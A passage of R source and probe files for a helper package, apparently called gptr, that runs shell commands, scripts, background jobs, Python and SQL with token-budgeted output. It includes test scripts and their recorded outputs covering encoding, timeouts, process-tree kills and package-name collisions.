    if (!j$p$is_alive()) stop("job exited before reading its input", call. = FALSE)
    if (proc.time()[["elapsed"]] > deadline) stop("timed out writing to job stdin", call. = FALSE)
    Sys.sleep(0.005)
  }
  invisible(j)
}
print.gptr_job = function(x, ...) {
  sz = file.size(x$out)
  cat(sprintf("<%s> %s, %.0fs, pid %s, %s unread; cmd: %s\n", x$id, job_status(x),
              as.numeric(difftime(Sys.time(), x$started, units = "secs")), x$p$get_pid(),
              fmt_bytes(max(0, (sz %||% 0) - x$pos)), x$cmd))
  invisible(x)
}
print.gptr_text = function(x, ...) { out_lines(unclass(x)); invisible(x) }
g5_jobs = function(kill = FALSE) {
  if (!length(G5$jobs)) return(invisible(data.frame()))
  if (kill) for (j in G5$jobs) j$kill()
  data.frame(id = names(G5$jobs), status = vapply(G5$jobs, job_status, ""),
             cmd = vapply(G5$jobs, function(j) substr(j$cmd, 1L, 40L), ""), row.names = NULL)
}

# ------------------------------------------------------------------ Python via reticulate
PY_HELPER = paste(
  "import ast, io, sys, traceback, contextlib",
  "def _gptr_run(src, max_rows=10):",
  "    g = __import__('__main__').__dict__",
  "    out, err = io.StringIO(), io.StringIO()",
  "    val, has, exc = None, False, None",
  "    try:",
  "        tree = ast.parse(src, filename='<gptr>', mode='exec')",
  "        last = None",
  "        if tree.body and isinstance(tree.body[-1], ast.Expr):",
  "            last = ast.Expression(tree.body.pop().value)",
  "        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):",
  "            exec(compile(tree, '<gptr>', 'exec'), g)",
  "            if last is not None:",
  "                val = eval(compile(last, '<gptr>', 'eval'), g)",
  "                has = val is not None",
  "    except Exception as e:",
  "        tb = traceback.extract_tb(e.__traceback__)",
  "        lines = src.splitlines()",
  "        where = [f'line {f.lineno}: {lines[f.lineno - 1].strip()}' for f in tb",
  "                 if f.filename == '<gptr>' and 0 < f.lineno <= len(lines)]",
  "        if isinstance(e, SyntaxError):",
  "            exc = f'SyntaxError: {e.msg} (line {e.lineno}: {(e.text or \"\").strip()})'",
  "        else:",
  "            exc = '\\n'.join(where[-2:] + traceback.format_exception_only(type(e), e)).strip()",
  "    rep = ''",
  "    if has:",
  "        try:",
  "            pd = sys.modules.get('pandas')",
  "            if pd is not None:",
  "                with pd.option_context('display.max_rows', max_rows, 'display.min_rows', max_rows,",
  "                                       'display.max_columns', 12, 'display.width', 160,",
  "                                       'display.expand_frame_repr', False):",
  "                    rep = repr(val)",
  "            else:",
  "                rep = repr(val)",
  "        except Exception as e:",
  "            rep = '<repr failed: %s>' % e",
  "        g['_'] = val",
  "    kind = ''",
  "    if has:",
  "        shp = getattr(val, 'shape', None)",
  "        kind = type(val).__name__ + (' ' + 'x'.join(map(str, shp)) if isinstance(shp, tuple) and shp else '')",
  "    return (out.getvalue(), err.getvalue(), rep, exc, val if has else None, kind)",
  sep = "\n")

py_ready = function(python = NULL) {
  if (!requireNamespace("reticulate", quietly = TRUE))
    stop("gptr$py() needs the 'reticulate' package", call. = FALSE)
  if (!reticulate::py_available(initialize = FALSE)) {
    if (!is.null(python)) reticulate::use_python(python, required = TRUE)
    else if (!nzchar(Sys.getenv("RETICULATE_PYTHON")) && !nzchar(Sys.getenv("VIRTUAL_ENV")) &&
             !isTRUE(getOption("gptr.py_managed", FALSE))) {
      # Without an explicit choice reticulate may provision a uv-managed Python (a download).
      stop("Python is not configured: set RETICULATE_PYTHON, pass python =, or ",
           "options(gptr.py_managed = TRUE) to allow reticulate's managed environment",
           call. = FALSE)
    }
  }
  main = reticulate::import_main(convert = FALSE)
  if (!reticulate::py_has_attr(main, "_gptr_run")) reticulate::py_run_string(PY_HELPER, convert = FALSE)
  main
}
g5_py = function(code, ..., python = NULL, max_tokens = NULL, max_rows = 10L) {
  main = py_ready(python)
  objs = list(...)
  for (nm in names(objs)) reticulate::py_set_attr(main, nm, reticulate::r_to_py(objs[[nm]]))
  res = main$`_gptr_run`(enc_utf8(paste(code, collapse = "\n")), as.integer(max_rows))
  item = function(i) reticulate::py_get_item(res, i)
  structure(list(stdout = reticulate::py_to_r(item(0L)), stderr = reticulate::py_to_r(item(1L)),
                 repr = reticulate::py_to_r(item(2L)), error = reticulate::py_to_r(item(3L)),
                 py = item(4L), kind = reticulate::py_to_r(item(5L))),
            class = "gptr_py", max_tokens = max_tokens)
}
`$.gptr_py` = function(x, name) {
  if (identical(name, "value")) return(reticulate::py_to_r(.subset2(x, "py")))
  .subset2(x, name)
}
format.gptr_py = function(x, ...) {
  mt = attr(x, "max_tokens") %||% G5$default_tokens
  txt = c(if (nzchar(.subset2(x, "stdout"))) sub("\n$", "", .subset2(x, "stdout")),
          if (nzchar(.subset2(x, "stderr"))) c("[stderr]", sub("\n$", "", .subset2(x, "stderr"))),
          if (nzchar(.subset2(x, "repr"))) .subset2(x, "repr"),
          if (!is.null(.subset2(x, "error"))) c("[python error]", .subset2(x, "error")))
  if (!length(txt)) return("(no output)")
  f = tempfile(); con = file(f, "wb"); writeBin(charToRaw(enc2utf8(paste(txt, collapse = "\n"))), con); close(con)
  v = budget_view(f, mt)
  if (!v$truncated) unlink(f)
  v$text
}
print.gptr_py = function(x, ...) { out_lines(format(x)); invisible(x) }

# ------------------------------------------------------------------ SQL through DBI
find_connection = function(envir) {
  nms = ls(envir)
  if (!length(nms)) return(NULL)
  lazy = rlang::env_binding_are_lazy(envir, nms) | rlang::env_binding_are_active(envir, nms)
  hits = character()
  for (nm in nms[!lazy]) {
    cls = class(envir[[nm]])                     # primitive only: no promise, no copy of big objects
    if (isTRUE(tryCatch(methods::extends(cls[1L], "DBIConnection"), error = function(e) FALSE)))
      hits = c(hits, nm)
  }
  hits
}
sql_is_query = function(q) {
  k = toupper(sub("^\\s*(--[^\n]*\n\\s*|/\\*.*?\\*/\\s*)*", "", q, perl = TRUE))
  grepl("^(SELECT|WITH|VALUES|SHOW|DESCRIBE|EXPLAIN|PRAGMA|TABLE|FROM|SUMMARIZE)\\b", k)
}
g5_sql = function(query, ..., con = NULL, n = 10L, max_rows = 100000L, envir = parent.frame()) {
  if (!requireNamespace("DBI", quietly = TRUE)) stop("gptr$sql() needs the 'DBI' package", call. = FALSE)
  frames = list(...)
  if (is.null(con) && length(frames)) {
    if (!requireNamespace("duckdb", quietly = TRUE))
      stop("SQL over data frames needs the 'duckdb' package; or pass con =", call. = FALSE)
    if (is.null(G5$duck)) G5$duck = DBI::dbConnect(duckdb::duckdb())
    con = G5$duck
    for (nm in names(frames)) duckdb::duckdb_register(con, nm, frames[[nm]])
    on.exit(for (nm in names(frames)) duckdb::duckdb_unregister(con, nm), add = TRUE)
  }
  if (is.null(con)) {
    hits = find_connection(envir)
    if (length(hits) != 1L)
      stop(if (!length(hits)) "no DBI connection in scope; pass con ="
           else sprintf("several connections in scope (%s); pass con =", paste(hits, collapse = ", ")),
           call. = FALSE)
    con = envir[[hits]]
  }
  if (!sql_is_query(query)) {
    k = DBI::dbExecute(con, query)
    return(structure(list(rows_affected = k), class = "gptr_sql_exec"))
  }
  rs = DBI::dbSendQuery(con, query)
  on.exit(DBI::dbClearResult(rs), add = TRUE)
  df = DBI::dbFetch(rs, n = max_rows + 1L)
  more = nrow(df) > max_rows
  if (more) df = df[seq_len(max_rows), , drop = FALSE]
  attr(df, "gptr_more") = more
  attr(df, "gptr_n") = n
  class(df) = c("gptr_sql", class(df))
  df
}
print.gptr_sql = function(x, ...) {
  n = attr(x, "gptr_n") %||% 10L
  more = isTRUE(attr(x, "gptr_more"))
  y = x
  class(y) = setdiff(class(y), "gptr_sql")
  attr(y, "gptr_more") = NULL; attr(y, "gptr_n") = NULL
  cat(sprintf("# %s rows%s x %d cols\n", format(nrow(y), big.mark = ","), if (more) "+" else "", ncol(y)))
  old = options(width = 100); on.exit(options(old))
  print(utils::head(y, n), row.names = FALSE)
  if (nrow(y) > n) cat(sprintf("# ... %s more rows (all fetched rows are in the value)\n",
                               format(nrow(y) - n, big.mark = ",")))
  invisible(x)
}
print.gptr_sql_exec = function(x, ...) { cat(sprintf("# %d rows affected\n", x$rows_affected)); invisible(x) }

# ------------------------------------------------------------------ knitr language engines
g5_knit = function(engine, code, ..., max_tokens = NULL) {
  code = paste(code, collapse = "\n")
  switch(engine,
    bash = , sh = , zsh = return(g5_sh(code, shell = engine, max_tokens = max_tokens, ...)),
    python = return(g5_py(code, max_tokens = max_tokens)),
    sql = return(g5_sql(code, ...)))
  if (!requireNamespace("knitr", quietly = TRUE)) stop("gptr$knit() needs 'knitr'", call. = FALSE)
  eng = knitr::knit_engines$get(engine)
  if (is.null(eng)) stop(sprintf("unknown knitr engine: %s", engine), call. = FALSE)
  opts = knitr::opts_chunk$merge(list(engine = engine, code = strsplit(code, "\n", fixed = TRUE)[[1]],
                                      label = "gptr", echo = FALSE, results = "asis", ...))
  out = suppressMessages(eng(opts))          # knitr prints "running: <cmd>" as a message
  structure(strsplit(sub("\n+$", "", paste(out, collapse = "\n")), "\n", fixed = TRUE)[[1]],
            class = "gptr_text")
}

# ------------------------------------------------------------------ registration of built-ins
gptr_register_interpreter("sh", c("<shell>", "sh"))
gptr_register_interpreter("bash", c("bash", "<shell>"))
gptr_register_interpreter("zsh", "zsh")
gptr_register_interpreter("py", c("python3", "python", "py"))
gptr_register_interpreter("r", file.path(R.home("bin"), if (is_windows()) "Rscript.exe" else "Rscript"))
gptr_register_interpreter("js", "node"); gptr_register_interpreter("mjs", "node")
gptr_register_interpreter("pl", "perl"); gptr_register_interpreter("rb", "ruby")
gptr_register_interpreter("jl", "julia")
gptr_register_interpreter("ps1", c("pwsh", "powershell"), c("-NoProfile", "-NonInteractive", "-File"))
gptr_register_interpreter("cmd", Sys.getenv("COMSPEC", "cmd.exe"), c("/d", "/c", "call"), windows_only = TRUE)
gptr_register_interpreter("bat", Sys.getenv("COMSPEC", "cmd.exe"), c("/d", "/c", "call"), windows_only = TRUE)

gptr_register_bridge("sh", g5_sh, describe = "run a program (argv vector) or shell string")
gptr_register_bridge("script", g5_script, describe = "run a script file by extension")
gptr_register_bridge("bg", g5_bg, describe = "start a background job; $read() $wait() $kill() $write()")
gptr_register_bridge("jobs", g5_jobs, describe = "list background jobs")
gptr_register_bridge("py", g5_py, describe = "Python in a persistent reticulate session")
gptr_register_bridge("sql", g5_sql, describe = "SQL on a DBI connection or on data frames (duckdb)")
gptr_register_bridge("knit", g5_knit, describe = "any knitr language engine")
gptr_register_bridge("out", g5_out, describe = "a recent helper result by id (from a truncation notice)")
````

### `p01_probes.R`

````r
# G5 probe 1: facts the helper design depends on (Rscript --vanilla, R 4.4.3)

cat("== (a) S3 `$` dispatch on a classed closure (gateway doubles as namespace) ==\n")
gw = structure(function(...) paste("prompt:", ...), class = c("gw_gateway", "function"))
`$.gw_gateway` = function(x, name) function(...) paste0("helper ", name, "(", paste(..., sep = ", "), ")")
`[[.gw_gateway` = function(x, i, ...) `$.gw_gateway`(x, i)
.DollarNames.gw_gateway = function(x, pattern = "") grep(pattern, c("sh", "py", "sql"), value = TRUE)
cat("call     :", gw("hello"), "\n")
cat("dollar   :", gw$sh("git status"), "\n")
cat("brackets :", gw[["py"]]("x = 1"), "\n")
cat("is.function:", is.function(gw), " class:", paste(class(gw), collapse = "/"), "\n")
cat("completion :", paste(utils:::.DollarNames(gw, "s"), collapse = ","), "\n")
cat("args()     :", deparse(args(gw))[1], "\n")

cat("\n== (b) processx::run defaults ==\n")
f = formals(processx::run)
cat("run() formals:", paste(names(f), collapse = ", "), "\n")
cat("default stdin:", deparse(f$stdin), " default encoding:", deparse(f$encoding), "\n")
# does a child that reads stdin hang when stdin is not given? (cat with no file reads stdin)
t0 = proc.time()[["elapsed"]]
r = processx::run("cat", character(), timeout = 3, error_on_status = FALSE)
cat(sprintf("cat with default stdin: status=%s timeout=%s stdout=%s elapsed=%.2fs\n",
            r$status, r$timeout, deparse(r$stdout), proc.time()[["elapsed"]] - t0))
# timeout kills the child and reports it
t0 = proc.time()[["elapsed"]]
r = processx::run("sleep", "10", timeout = 1, error_on_status = FALSE)
cat(sprintf("sleep 10, timeout 1: status=%s timeout=%s elapsed=%.2fs\n", r$status, r$timeout,
            proc.time()[["elapsed"]] - t0))
# non-UTF-8 locale: default encoding vs "UTF-8" for non-ASCII child output
cat("locale:", Sys.getlocale("LC_CTYPE"), "\n")
cmd = c("-c", "import sys; sys.stdout.buffer.write('caf\\u00e9 \\u4e2d\\n'.encode('utf-8'))")
r1 = processx::run("python3", cmd)
r2 = processx::run("python3", cmd, encoding = "UTF-8")
cat("default encoding bytes:", paste(as.character(charToRaw(r1$stdout)), collapse = " "), " Encoding:", Encoding(r1$stdout), "\n")
cat("UTF-8 encoding bytes  :", paste(as.character(charToRaw(r2$stdout)), collapse = " "), " Encoding:", Encoding(r2$stdout), "\n")

cat("\n== (c) sink() capture gap for child processes ==\n")
tf = tempfile(fileext = ".txt")
con = file(tf, open = "wb")
sink(con)
cat("R cat() line\n")
invisible(system("echo from system", intern = FALSE))
invisible(system2("echo", "from system2 default stdout"))
x = system2("echo", "from system2 stdout=TRUE", stdout = TRUE)
print(x)
invisible(system2("sh", c("-c", shQuote("echo to-stderr 1>&2"))))
sink()
close(con)
cat("captured by sink:\n"); cat(paste0("  | ", readLines(tf)), sep = "\n")
cat("(lines 'from system', 'from system2 default stdout' and 'to-stderr' went to the process fds, not the sink)\n")
````

### `p01_probes.out`

````text
== (a) S3 `$` dispatch on a classed closure (gateway doubles as namespace) ==
call     : prompt: hello 
dollar   : helper sh(git status) 
brackets : helper py(x = 1) 
is.function: TRUE  class: gw_gateway/function 
completion : sh,sql 
args()     : function (...)  

== (b) processx::run defaults ==
run() formals: command, args, error_on_status, wd, echo_cmd, echo, spinner, timeout, stdout, stderr, stdout_line_callback, stdout_callback, stderr_line_callback, stderr_callback, stderr_to_stdout, env, windows_verbatim_args, windows_hide_window, encoding, cleanup_tree, ... 
default stdin: NULL  default encoding: "" 
cat with default stdin: status=0 timeout=FALSE stdout="" elapsed=0.01s
sleep 10, timeout 1: status=-9 timeout=TRUE elapsed=1.01s
locale: C 
default encoding bytes: 63 61 66 20 0a  Encoding: unknown 
UTF-8 encoding bytes  : 63 61 66 3c 55 2b 30 30 45 39  Encoding: unknown 

== (c) sink() capture gap for child processes ==
from system
from system2 default stdout
to-stderr
captured by sink:
  | R cat() line
  | [1] "from system2 stdout=TRUE"
(lines 'from system', 'from system2 default stdout' and 'to-stderr' went to the process fds, not the sink)
````

### `p02_encoding.R`

````r
# G5 probe 2: how to get child output into R as correct UTF-8 in any locale
cat("locale:", Sys.getlocale("LC_CTYPE"), " l10n UTF-8:", l10n_info()[["UTF-8"]], "\n")
py = Sys.which("python3")
code = "import sys; sys.stdout.buffer.write('caf\\u00e9 \\u4e2d\\n'.encode('utf-8'))"
show = function(label, x) cat(sprintf("%-38s bytes=[%s] enc=%s nchar=%s\n", label,
  paste(as.character(charToRaw(x)), collapse = " "), Encoding(x), nchar(x, type = "chars", allowNA = TRUE)))

r = processx::run(py, c("-c", code), encoding = "UTF-8")
show("run(encoding='UTF-8')$stdout", r$stdout)
r = processx::run(py, c("-c", code))
show("run(encoding='')$stdout", r$stdout)

p = processx::process$new(py, c("-c", code), stdout = "|", encoding = "UTF-8")
p$wait(); x = p$read_all_output()
show("process$new(encoding='UTF-8') read_all", x)

p = processx::process$new(py, c("-c", code), stdout = "|")
p$wait(); x = p$read_all_output()
show("process$new(encoding='') read_all", x)

# File route: child writes raw bytes to a file; R reads bytes and marks UTF-8
f = tempfile()
r = processx::run(py, c("-c", code), stdout = f)
b = readBin(f, "raw", file.size(f))
x = rawToChar(b); Encoding(x) = "UTF-8"
show("stdout=<file>, readBin + mark UTF-8", x)
cat("validUTF8:", validUTF8(x), "\n")
# Does the marked string survive paste/strsplit/jsonlite in this locale?
y = strsplit(x, "\n", fixed = TRUE)[[1]]
show("  after strsplit", y[1])
z = paste0(y[1], " !")
show("  after paste0", z)
cat("  jsonlite:", as.character(jsonlite::toJSON(y[1], auto_unbox = TRUE)), "\n")
````

### `p02_encoding_C.out`

````text
locale: C  l10n UTF-8: FALSE 
run(encoding='UTF-8')$stdout           bytes=[63 61 66 3c 55 2b 30 30 45 39] enc=unknown nchar=10
run(encoding='')$stdout                bytes=[63 61 66 20 0a] enc=unknown nchar=5
process$new(encoding='UTF-8') read_all bytes=[63 61 66 c3 a9 20 e4 b8 ad 0a] enc=UTF-8 nchar=7
process$new(encoding='') read_all      bytes=[63 61 66 20 0a] enc=unknown nchar=5
stdout=<file>, readBin + mark UTF-8    bytes=[63 61 66 c3 a9 20 e4 b8 ad 0a] enc=UTF-8 nchar=7
validUTF8: TRUE 
  after strsplit                       bytes=[63 61 66 c3 a9 20 e4 b8 ad] enc=UTF-8 nchar=6
  after paste0                         bytes=[63 61 66 c3 a9 20 e4 b8 ad 20 21] enc=UTF-8 nchar=8
  jsonlite: "caf<U+00E9> <U+4E2D>" 
````

### `p02_encoding_UTF8.out`

````text
locale: en_US.UTF-8  l10n UTF-8: TRUE 
run(encoding='UTF-8')$stdout           bytes=[63 61 66 c3 a9 20 e4 b8 ad 0a] enc=unknown nchar=7
run(encoding='')$stdout                bytes=[63 61 66 c3 a9 20 e4 b8 ad 0a] enc=unknown nchar=7
process$new(encoding='UTF-8') read_all bytes=[63 61 66 c3 a9 20 e4 b8 ad 0a] enc=UTF-8 nchar=7
process$new(encoding='') read_all      bytes=[63 61 66 c3 a9 20 e4 b8 ad 0a] enc=UTF-8 nchar=7
stdout=<file>, readBin + mark UTF-8    bytes=[63 61 66 c3 a9 20 e4 b8 ad 0a] enc=UTF-8 nchar=7
validUTF8: TRUE 
  after strsplit                       bytes=[63 61 66 c3 a9 20 e4 b8 ad] enc=UTF-8 nchar=6
  after paste0                         bytes=[63 61 66 c3 a9 20 e4 b8 ad 20 21] enc=UTF-8 nchar=8
  jsonlite: "café 中" 
````

### `p03_collisions.R`

````r
# G5 probe 3: which candidate helper names are already exported by CRAN packages?
# Sources: (1) r-universe search API field query exports:<name> (covers CRAN + universes),
#          cross-checked against the live CRAN package list; (2) NAMESPACE files of the
#          locally installed library (parseNamespaceFile, no namespace is loaded).
cands = c("sh", "py", "sql", "run", "shell", "bg", "jobs", "job", "script", "knit", "cmd",
          "exec", "run_cmd", "sys", "bash", "python", "gptr", "gptr_sh", "gptr_py", "gptr_sql",
          "gptr_run", "gptr_script", "gptr_bg", "gptr_knit", "tools", "tool", "g", "gp")

cran = rownames(utils::available.packages(repos = "https://cloud.r-project.org"))
cat("CRAN packages in index:", length(cran), "\n")

ru = function(name) {
  u = sprintf("https://r-universe.dev/api/search?q=exports:%s&limit=500", utils::URLencode(name, reserved = TRUE))
  d = tryCatch(jsonlite::fromJSON(u, simplifyVector = FALSE), error = function(e) NULL)
  if (is.null(d)) return(list(total = NA, pkgs = character()))
  pk = unique(vapply(d$results, function(r) r$Package, ""))
  list(total = if (is.null(d$total)) NA_integer_ else as.integer(d$total), query = paste(names(d$query), unlist(d$query), collapse = ";"), pkgs = pk)
}

# local scan: exports and exportPatterns of every installed package, without loading
libs = .libPaths()
inst = unique(unlist(lapply(libs, function(l) list.files(l))))
local_exports = list()
for (l in libs) for (p in list.files(l)) {
  if (!file.exists(file.path(l, p, "NAMESPACE"))) next
  ns = tryCatch(parseNamespaceFile(p, l), error = function(e) NULL)
  if (is.null(ns)) next
  local_exports[[p]] = ns$exports
}
cat("installed packages scanned:", length(local_exports), "\n\n")

rows = lapply(cands, function(nm) {
  r = ru(nm)
  on_cran = intersect(r$pkgs, cran)
  loc = names(local_exports)[vapply(local_exports, function(e) nm %in% e, NA)]
  data.frame(name = nm, query = r$query, universe_total = r$total, cran_n = length(on_cran),
             cran_examples = paste(utils::head(sort(on_cran), 6), collapse = ","),
             local = paste(utils::head(sort(loc), 6), collapse = ","), stringsAsFactors = FALSE)
})
tab = do.call(rbind, rows)
old = options(width = 200)
print(tab, right = FALSE, row.names = FALSE)
options(old)
````

### `p03_collisions.out`

````text
CRAN packages in index: 25106 
installed packages scanned: 612 

 name        query                universe_total cran_n cran_examples                                    local                                              
 sh          _exports sh           2              2     seewave,shapes                                                                                      
 py          _exports py           5              4     organizr,reticulate,rpyANTs,rpymat               reticulate                                         
 sql         _exports sql          8              4     civis,dbplyr,dplyr,wizaRdry                      dbplyr,dplyr                                       
 run         _exports run         60             38     AMAPVox,IxPopDyMod,Rapp,Recocrop,Rquefts,Rwofost callr,future,languageserver,processx,renv,rmarkdown
 shell       _exports shell       NA              0                                                                                                         
 bg          _exports bg           4              2     AFR,flextable                                                                                       
 jobs        _exports jobs         4              4     TMDb,doRedis,openrouteservice,tmdbR                                                                 
 job         _exports job          1              1     job                                                                                                 
 script      _exports script       3              2     html5,script                                                                                        
 knit        _exports knit         2              1     knitr                                            knitr                                              
 cmd         _exports cmd          2              2     ClimInd,MESS                                                                                        
 exec        _exports exec         6              3     purrr,rlang,yulab.utils                          decoupleR,purrr,rlang,yulab.utils                  
 run_cmd     _exports run_cmd      1              1     bsub                                                                                                
 sys         _exports sys          2              2     Hmisc,SampleSelectR                                                                                 
 bash        _exports bash         3              1     devtools                                         devtools                                           
 python      _exports python       1              0                                                                                                         
 gptr        _exports gptr        NA              0                                                                                                         
 gptr_sh     _exports gptr_sh     NA              0                                                                                                         
 gptr_py     _exports gptr_py     NA              0                                                                                                         
 gptr_sql    _exports gptr_sql    NA              0                                                                                                         
 gptr_run    _exports gptr_run    NA              0                                                                                                         
 gptr_script _exports gptr_script NA              0                                                                                                         
 gptr_bg     _exports gptr_bg     NA              0                                                                                                         
 gptr_knit   _exports gptr_knit   NA              0                                                                                                         
 tools       _exports tools        1              1     eppoFindeR                                                                                          
 tool        _exports tool         4              4     aisdk,ellmer,epiworldR,mcplite                   ellmer                                             
 g           _exports g           10              9     Aoptbdtvc,CSTE,GECal,Opt5PL,cgaim,ibd                                                               
 gp          _exports gp          14             11     GPBayes,RiskMap,brms,cccp,dgpsi,gitr                                                                
````

### `p04_sh.R`

````r
# G5 prototype test 4: gptr$sh / gptr$script -- argv and string forms, UTF-8, stderr,
# exit status, timeout, stdin input, truncation with spill file, shell resolution.
source("g5_helpers.R")
.libPaths(c("/private/tmp/claude-501/-Users-wanjun-Desktop-gptr/83328d91-4e9c-4e94-af92-129127432c8d/scratchpad/rlib", .libPaths()))
tok = function(x) rtiktoken::get_token_count(paste(x, collapse = "\n"), "o200k_base")
ok = function(label, cond) cat(sprintf("[%s] %s\n", if (isTRUE(cond)) "PASS" else "FAIL", label))
W = tempfile("g5w-"); dir.create(W)

cat("locale:", Sys.getlocale("LC_CTYPE"), "| shell:", gptr_shell_resolve()$name, "\n\n")

cat("--- argv form ---\n")
r = gptr$sh(c("printf", "%s\\n", "a b", "caf\u00e9"))
print(r)
ok("argv form keeps 'a b' as one argument", identical(r$stdout[1], "a b"))
ok("UTF-8 in C locale: stdout marked UTF-8 and correct bytes",
   identical(Encoding(r$stdout[2]), "UTF-8") &&
   identical(charToRaw(r$stdout[2]), as.raw(c(0x63, 0x61, 0x66, 0xc3, 0xa9))))
u = "caf\u00e9"; Encoding(u) = "UTF-8"
r = gptr$sh(c("printf", "%s\\n", u))
ok("UTF-8-marked argument reaches the child as UTF-8 bytes",
   identical(charToRaw(r$stdout), as.raw(c(0x63, 0x61, 0x66, 0xc3, 0xa9))))

cat("\n--- string form: simple command runs without a shell ---\n")
r = gptr$sh("git --version")
print(r); ok("simple string -> direct exec", identical(r$via, "direct"))
r = gptr$sh("echo 'quoted words' plain")
ok("quotes handled by the splitter", identical(r$via, "direct") && identical(r$stdout, "quoted words plain"))

cat("\n--- string form with shell syntax goes to the resolved shell ---\n")
r = gptr$sh("printf 'x\\ny\\nx\\n' | sort | uniq -c | sort -rn")
print(r); ok("pipeline via shell", !identical(r$via, "direct") && grepl("2 x", r$stdout[1]))

cat("\n--- stderr kept separate, non-zero exit reported, no throw ---\n")
r = gptr$sh("echo out; echo 'oops' 1>&2; exit 3")
print(r)
ok("status 3", identical(r$status, 3L)); ok("stderr separate", identical(r$stderr, "oops"))
e = tryCatch(gptr$sh("exit 4", check = TRUE), gptr_error_command = function(e) e)
ok("check = TRUE raises classed error", inherits(e, "gptr_error_command"))

cat("\n--- stdin input from an R character vector and a data frame ---\n")
r = gptr$sh("sort | uniq -c", input = c("b", "a", "b"))
print(r)
r = gptr$sh(c("python3", "-c", "import sys,csv; rows=list(csv.DictReader(sys.stdin)); print(len(rows), sorted(rows[0]))"),
            input = head(mtcars[, 1:3], 5))
print(r); ok("data frame as CSV on stdin", grepl("^5 ", r$stdout))

cat("\n--- timeout kills the whole process tree ---\n")
t0 = proc.time()[["elapsed"]]
r = gptr$sh("sleep 30 & sleep 31; wait", timeout = 1)
el = proc.time()[["elapsed"]] - t0
print(r)
Sys.sleep(0.5)
left = processx::run("pgrep", c("-f", "sleep 3[01]"), error_on_status = FALSE)$stdout
ok(sprintf("timed out in %.1fs and no sleep left", el), isTRUE(r$timed_out) && !nzchar(left))

cat("\n--- truncation to a token budget with a spill file ---\n")
r = gptr$sh(c("seq", "1", "20000"), max_tokens = 120)
print(r)
ok("full output kept in spill file", length(r$stdout) == 20000L)
ok(sprintf("printed view within budget (%d est. / %d o200k tokens for a 120-token budget + notice)",
           est_tokens(format(r)), tok(format(r))), est_tokens(format(r)) <= 120 * 1.15 + 60)

cat("\n--- ANSI colour and carriage-return progress are cleaned ---\n")
r = gptr$sh("printf '\\033[31mred\\033[0m\\n10%%\\r50%%\\r100%%\\n'")
print(r); ok("clean", identical(r$stdout, c("red", "100%")))

cat("\n--- scripts by extension ---\n")
writeLines(c("echo \"sh script args: $@\""), file.path(W, "a.sh"))
writeLines(c("import sys", "print('py script', sys.argv[1:])"), file.path(W, "b.py"))
writeLines(c("cat('R script', commandArgs(TRUE), '\\n')"), file.path(W, "c.R"))
writeLines(c("console.log('js script', process.argv.slice(2))"), file.path(W, "d.js"))
writeLines(c("#!/usr/bin/env python3", "print('shebang ok')"), file.path(W, "tool"))
for (f in c("a.sh", "b.py", "c.R", "d.js")) print(gptr$script(file.path(W, f), c("x", "y z")))
print(gptr$script(file.path(W, "tool")))
e = tryCatch(gptr$script(file.path(W, "x.cmd")), error = function(e) conditionMessage(e))
cat("missing .cmd:", e, "\n")

cat("\n--- RNG untouched ---\n")
set.seed(1); a = runif(1); set.seed(1); invisible(gptr$sh("true")); b = runif(1)
ok("helper does not consume .Random.seed", identical(a, b))
cat("\n--- no R connections left open ---\n")
ok("showConnections() empty", nrow(showConnections()) == 0L)
````

### `p04_sh.out`

````text
locale: C | shell: bash 

--- argv form ---
a b
café
[PASS] argv form keeps 'a b' as one argument
[PASS] UTF-8 in C locale: stdout marked UTF-8 and correct bytes
[PASS] UTF-8-marked argument reaches the child as UTF-8 bytes

--- string form: simple command runs without a shell ---
git version 2.54.0 (Apple Git-157)
[PASS] simple string -> direct exec
[PASS] quotes handled by the splitter

--- string form with shell syntax goes to the resolved shell ---
   2 x
   1 y
[PASS] pipeline via shell

--- stderr kept separate, non-zero exit reported, no throw ---
out
[stderr]
oops
[exit 3]
[PASS] status 3
[PASS] stderr separate
[PASS] check = TRUE raises classed error

--- stdin input from an R character vector and a data frame ---
   1 a
   2 b
5 ['cyl', 'disp', 'mpg']
[PASS] data frame as CSV on stdin

--- timeout kills the whole process tree ---
[timed out after 1.13s; process tree killed]
[PASS] timed out in 1.1s and no sleep left

--- truncation to a token budget with a spill file ---
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
[... 19,969 lines omitted (20,000 total, 106.3KB); full output: /var/folders/83/pgprwt8s3w5_cgrt3rz3x21w0000gn/T//RtmpKAI3sS/gptr-out-d3ff22cdace8.log]
19989
19990
19991
19992
19993
19994
19995
19996
19997
19998
19999
20000
[PASS] full output kept in spill file
[PASS] printed view within budget (180 est. / 144 o200k tokens for a 120-token budget + notice)

--- ANSI colour and carriage-return progress are cleaned ---
red
100%
[PASS] clean

--- scripts by extension ---
sh script args: x y z
py script ['x', 'y z']
R script x y z 
js script [ 'x', 'y z' ]
shebang ok
missing .cmd: script not found: /var/folders/83/pgprwt8s3w5_cgrt3rz3x21w0000gn/T//RtmpKAI3sS/g5w-d3ff1e781701/x.cmd 

--- RNG untouched ---
[PASS] helper does not consume .Random.seed

--- no R connections left open ---
[PASS] showConnections() empty
````

### `p04b_debug.R`

````r
source("g5_helpers.R")
x = "café"
cat("arg Encoding:", Encoding(x), " bytes:", paste(charToRaw(x), collapse = " "), "\n")
r = gptr$sh(c("printf", "%s\\n", x))
cat("child printed bytes:", paste(readBin(r$files[["stdout"]], "raw", 100), collapse = " "), "\n")
# does processx translate args to native? try passing the arg as native-unmarked bytes
y = x; Encoding(y) = "bytes"
p = processx::process$new("printf", c("%s\\n", y), stdout = "|"); p$wait()
cat("bytes-encoded arg -> child printed:", paste(charToRaw(p$read_all_output()), collapse = " "), "\n")
z = x; Encoding(z) = "unknown"
p = processx::process$new("printf", c("%s\\n", z), stdout = "|"); p$wait()
cat("unknown-encoded arg -> child printed:", paste(charToRaw(p$read_all_output()), collapse = " "), "\n")
# timeout tree kill check
r = gptr$sh("sleep 30 & sleep 31; wait", timeout = 1)
Sys.sleep(1)
cat("left after timeout:", processx::run("pgrep", c("-fl", "sleep 3[01]"), error_on_status = FALSE)$stdout, "\n")
````

### `p04c_killtree.R`

````r
try_kill = function(label, env) {
  p = processx::process$new("/bin/bash", c("-c", "sleep 30 & sleep 31; wait"), env = env,
                            cleanup_tree = TRUE, stdout = NULL)
  Sys.sleep(0.5)
  k = tryCatch(p$kill_tree(), error = function(e) paste("ERROR:", conditionMessage(e)))
  Sys.sleep(0.5)
